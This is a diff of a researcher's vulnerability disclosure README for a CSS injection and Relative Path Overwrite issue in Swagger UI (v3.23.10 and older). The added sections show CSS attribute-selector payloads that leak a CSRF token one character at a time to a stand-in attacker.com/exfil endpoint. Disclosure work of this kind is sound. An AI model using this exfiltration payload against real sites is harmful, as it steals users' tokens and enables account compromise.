@@ -1,6 +1,6 @@
 # CSS-injection-in-Swagger-UI
 
-We have found a CSS Injection vulnerability on Swagger UI that allows us to use the Non-Root-Relative Path Overwrite (RPO) technique to steal users' tokens based on the attribute selectors feature.
+We have found a CSS Injection vulnerability on Swagger UI that allows attacker to use the Relative Path Overwrite (RPO) technique to perform CSS-based input field value exfiltration.
 
 **Researcher: Kevin (DatLP) of The Tarantula Team, VinCSS (a member of Vingroup)**
 
@@ -16,7 +16,11 @@ We've discovered the vulnerability when reading the following in the document of
 We’ve observed that the ?url= parameter in SwaggerUI allows an aacker to override an otherwise hard‐coded schema file
 The decision was made to put this in the public issue tracker because (a) we aren’t going to immediately fix this, and (b) the aack surface for this is significantly diminished by our effecve sanizaon efforts to deter XSS aacks in documents used as input.
 ```
-Swagger had known the issue for a long time, but Swagger thought that this vulnerability could not lead to an Cross-Site Scripting (XSS) exploit there so they ignored it. So We have decided to further research on this issue. We realize that Swagger UI allows users to embed Json from remote servers
+Swagger had known the issue for a long time, but Swagger thought that this vulnerability could not lead to an Cross-Site Scripting (XSS) exploit there so they ignored it. So we have decided to further research on this issue. 
+
+### Injection step:
+
+We realize that Swagger UI allows users to embed untrusted Json from remote servers 
 
 ```javascript
 var url = window.location.search.match(/url=([^&]+)/);
@@ -30,10 +34,48 @@ url: url, // ...
 var ui = SwaggerUIBundle(swaggerOptions)
 ```
 
-(continue)
+This means we can inject json via the GET parameter. In the json content we use the <style> tag and CSS @import rule to load the CSS payload.
+    
+![](PoC-RPO-1.png)
+    
+### Exfiltration step:
 
+With CSS payload, we can use Relative Path Overwrite (RPO) technique to perform CSS-based input field value exfiltration. The following CSS code will generate a callback query to the attacker's server (https://attacker.com/exfil/a) if the CSRF token value starts with a, similarly it will make other requests (https://attacker.com/exfil/b; (https://attacker.com/exfil/c; (https://attacker.com/exfil/d) if the CSRF token value begins with b, c or d:
+
+```css
+input[name=csrf][value^=a]{
+    background-image: url(https://attacker.com/exfil/a);
+}
+input[name=csrf][value^=b]{
+    background-image: url(https://attacker.com/exfil/b);
+}
+...
+input[name=csrf][value^=9]{
+    background-image: url(https://attacker.com/exfil/9);
+```
+And after we have found the first character in the CSRF token value, we will continue to search for the second character and so on:
+
+```css
+input[name=csrf][value^=aa]{
+    background-image: url(https://attacker.com/exfil/ca);
+}
+input[name=csrf][value^=ab]{
+    background-image: url(https://attacker.com/exfil/cb);
+}
+/* ...
+input[name=csrf][value^=a9]{
+    background-image: url(https://attacker.com/exfil/c9);
+```
+
+With sequential @import chaining as below so we can steal full of CSRF token value:
+
+![](sequential import chaining.png)
+
+You can automate all this by using the sic tool [6]
+
+    
 ## Tested versions
-Lastest version of XXX. Release: September XX, XX.
+Swagger UI v3.23.10 and older versions
 
 ## Disclosure timeline
 
